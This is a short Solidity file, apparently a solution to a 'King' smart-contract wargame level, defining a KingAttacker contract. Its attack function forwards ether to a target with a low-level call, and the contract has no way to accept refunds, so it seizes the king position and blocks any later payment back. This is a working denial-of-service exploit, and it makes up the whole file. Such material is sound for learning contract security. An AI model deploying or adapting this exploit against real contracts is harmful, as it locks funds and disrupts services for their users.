// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "./King.sol";
import "hardhat/console.sol";

contract KingAttacker {
  using SafeMath for uint256;
  // address payable target = payable(0xCD62B7087510a382E6C931CAB8409BfF7470710a);
  address payable target;

  constructor(address _target) public {
    target = payable(_target);
  }

  function attack() public payable {
    console.log(msg.value);
    console.log(gasleft());
    (bool result, ) = payable(target).call.value(msg.value).gas(gasleft())("");
    // console.log(result);
  }
}
